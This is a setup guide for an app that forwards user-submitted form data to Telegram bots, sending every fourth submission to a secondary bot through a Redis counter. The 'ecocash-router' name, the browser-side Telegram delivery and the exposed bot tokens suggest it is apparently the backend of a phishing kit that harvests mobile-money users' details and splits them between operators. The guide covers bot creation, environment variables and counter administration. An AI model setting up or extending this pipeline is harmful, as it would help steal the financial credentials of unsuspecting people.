# Traffic Routing Setup Guide

## Overview
This application routes **every 4th user to a secondary Telegram bot** for accurate load distribution. The routing uses **Upstash Redis** for global atomic counting across all user sessions.

---

## How It Works

```
User 1  → PRIMARY BOT
User 2  → PRIMARY BOT  
User 3  → PRIMARY BOT
User 4  → SECONDARY BOT ✓
User 5  → PRIMARY BOT
User 6  → PRIMARY BOT
User 7  → PRIMARY BOT
User 8  → SECONDARY BOT ✓
...and so on
```

- **Counter stored in Redis**: Ensures accurate global counting
- **Atomic increment**: No race conditions, even with concurrent users
- **Fallback to primary**: If Redis fails, all traffic goes to primary bot

---

## Setup Instructions

### 1. Create Upstash Redis Database

1. Go to [https://upstash.com/](https://upstash.com/)
2. Sign up for a free account
3. Click **"Create Database"**
4. Choose:
   - **Name**: `ecocash-router` (or any name)
   - **Type**: `Regional` (cheaper) or `Global` (faster worldwide)
   - **Region**: Choose closest to your users
5. Click **"Create"**
6. Copy the following from your dashboard:
   - **REST URL** → `VITE_UPSTASH_REDIS_URL`
   - **REST TOKEN** → `VITE_UPSTASH_REDIS_TOKEN`

### 2. Create Secondary Telegram Bot

1. Open Telegram and search for **@BotFather**
2. Send `/newbot` command
3. Follow instructions to create your **secondary bot**
4. Copy the **bot token** → `VITE_TELEGRAM_BOT_TOKEN_2`
5. Send `/start` to your new bot
6. Get your chat ID:
   - Message **@userinfobot** on Telegram
   - Copy your **chat ID** → `VITE_TELEGRAM_CHAT_ID_2`
   - OR add bot to a group and get group chat ID

### 3. Configure Environment Variables

Copy `.env.example` to `.env`:

```bash
cp .env.example .env
```

Fill in all values:

```env
# PRIMARY BOT (your existing bot)
VITE_TELEGRAM_BOT_TOKEN=123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11
VITE_TELEGRAM_CHAT_ID=123456789

# SECONDARY BOT (new bot)
VITE_TELEGRAM_BOT_TOKEN_2=789012:XYZ-GHI5678jklMno-abc89D4e5f678gh99
VITE_TELEGRAM_CHAT_ID_2=987654321

# UPSTASH REDIS
VITE_UPSTASH_REDIS_URL=https://your-redis-url.upstash.io
VITE_UPSTASH_REDIS_TOKEN=your_redis_token_here
```

---

## Testing the Routing

### Console Logs
When a user submits data, you'll see:
```
🎯 User #1 → PRIMARY BOT
📤 SENDING TO PRIMARY BOT: ...
```

```
🎯 User #4 → SECONDARY BOT
📤 SENDING TO SECONDARY BOT: ...
```

### Check Redis Counter
You can monitor the counter in your Upstash dashboard:
- Go to **Data Browser**
- Search for key: `user_counter`
- Value shows total users processed

### Manual Testing
To test routing with your browser:
1. Open dev console (F12)
2. Submit a form
3. Check console logs for routing info
4. Clear cache and repeat to increment counter

---

## Admin Functions

### Check Current Count
```typescript
import { getCurrentCount } from './utils/botRouter'

const count = await getCurrentCount()
console.log(`Total users: ${count}`)
```

### Reset Counter (Use with Caution!)
```typescript
import { resetCounter } from './utils/botRouter'

await resetCounter() // Resets counter to 0
```

---

## Troubleshooting

### Issue: All users go to PRIMARY BOT
**Solution**: Check Redis credentials in `.env`
- Verify `VITE_UPSTASH_REDIS_URL` is correct
- Verify `VITE_UPSTASH_REDIS_TOKEN` is correct
- Check browser console for Redis errors

### Issue: Messages not reaching SECONDARY BOT  
**Solution**: Check secondary bot credentials
- Verify `VITE_TELEGRAM_BOT_TOKEN_2` is correct
- Verify `VITE_TELEGRAM_CHAT_ID_2` is correct
- Make sure you've sent `/start` to the bot

### Issue: Counter increments but no messages sent
**Solution**: Check Telegram bot permissions
- Ensure both bots are active
- Check if chat IDs are correct
- Verify bot tokens haven't expired

---

## Cost & Limits

### Upstash Redis (Free Tier)
✅ **10,000 commands/day** (more than enough for most use cases)  
✅ **256 MB storage**  
✅ **No credit card required**  

**Estimate**: With 1000 users/day, you'll use ~1000 INCR commands (well within free tier)

### Paid Tier (if needed)
- **Pay-as-you-go**: $0.2 per 100K commands
- Even at 100K users/day: ~$0.20/day ($6/month)

---

## Architecture

```
User Submits Form
       ↓
getNextBot() called
       ↓
Redis INCR (atomic)
       ↓
counter % 4 === 0?
    ↙         ↘
  YES          NO
    ↓           ↓
SECONDARY    PRIMARY
   BOT         BOT
```

**Files involved:**
- [`src/utils/botRouter.ts`](src/utils/botRouter.ts) - Routing logic
- [`src/utils/telegram.ts`](src/utils/telegram.ts) - Message sending
- [`.env`](.env) - Configuration

---

## Support

If you need help, check:
1. Browser console for error messages
2. Upstash dashboard for Redis connectivity
3. Telegram bot status with @BotFather

**Happy routing! 🚀**
